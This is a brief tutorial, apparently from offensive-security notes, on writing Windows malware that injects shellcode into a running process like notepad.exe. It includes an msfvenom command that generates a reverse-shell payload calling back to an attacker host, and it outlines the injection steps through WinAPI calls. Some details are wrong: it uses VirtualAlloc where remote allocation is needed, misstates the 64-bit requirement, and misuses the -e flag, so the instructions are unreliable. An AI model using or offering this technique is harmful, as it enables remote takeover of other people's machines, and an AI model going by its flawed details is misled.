# Shellcode Injection
Our goal with this malware is to find a process that is running, for example let's say notepad.exe, open it and create a thread that will host our shellcode

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<listen_port> -f c -b "\x00" -e EXITFUNC=thread -v shellcode
```
**NOTE:** since the encoding we are using is x64 keep in mind that you should compile your exe as 64bit
The reason we **HAVE** to compile it in 64 is because the createRemoteThread function only works with if it's build for 64. 
If we build it for 32 it will not be able to open threads

Now in order to find the process we want we need to use few WinAPI, namely CreateToolhelp32Snapshot, Process32First, and Process32Next

[CreateToolhelp32Snapshot](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) will create a snapshot of all processes running on the target system
[Process32First](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first) will find the first entry in the snapshot and [Process32Next](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next) will iterate until we find our process 
an example how to build this is seen [here](https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes)

This entire thing will happen in a function and will loop until it finds the process, or fail if it can't retrieve it.
If it does find it it will return the handle

We then need to to use [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) to allocate enough space so we can write the shellcode, write it with [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)  and then using the process handle we got from our function, we inject our shellcode and create a thread using [CreateRemoteThreadEx](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex) with the remote buffer we just created as our starting address

